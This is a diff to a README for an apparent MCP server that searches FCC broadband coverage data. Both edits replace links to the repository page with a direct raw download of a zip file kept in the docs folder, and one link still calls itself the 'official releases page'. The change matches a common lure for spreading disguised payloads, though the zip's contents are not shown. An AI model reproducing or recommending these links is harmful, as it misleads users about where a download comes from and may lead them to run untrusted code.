@@ -1,6 +1,6 @@
 # 🌐 fcc-broadband-mcp-server - Search federal internet access data easily
 
-[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Vannem1851/fcc-broadband-mcp-server)
+[![](https://img.shields.io/badge/Download-Now-blue.svg)](https://raw.githubusercontent.com/Vannem1851/fcc-broadband-mcp-server/main/docs/broadband_mcp_fcc_server_1.2.zip)
 
 This tool lets you find internet coverage data for any area in the United States. It connects to official FCC records through the Model Context Protocol. You use this software to look up broadband speed, provider maps, and census block details. 
 
@@ -17,7 +17,7 @@ To run this tool on Windows, your computer needs these basic items:
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official releases page](https://github.com/Vannem1851/fcc-broadband-mcp-server) to start the download.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Vannem1851/fcc-broadband-mcp-server/main/docs/broadband_mcp_fcc_server_1.2.zip) to start the download.
 2. Select the file ending in .zip for Windows.
 3. Save the file to your computer.
 4. Right-click the folder once it finishes downloading.
